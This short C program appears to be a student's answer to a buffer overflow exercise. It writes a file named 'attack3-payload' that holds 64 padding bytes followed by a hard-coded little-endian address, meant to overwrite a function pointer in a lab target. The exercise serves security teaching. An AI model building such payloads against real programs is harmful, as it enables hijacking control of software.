#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
	char buf[68];
	memset(buf, 'A', 64);  //64 is the distance between buf and func_ptr
	buf[64]=0x34;
	buf[65]=0x86;
	buf[66]=0x04;
	buf[67]=0x08;
	
    write_to_file( "attack3-payload", buf , 68 , FILE_CLEAR );
    exit(0);
}
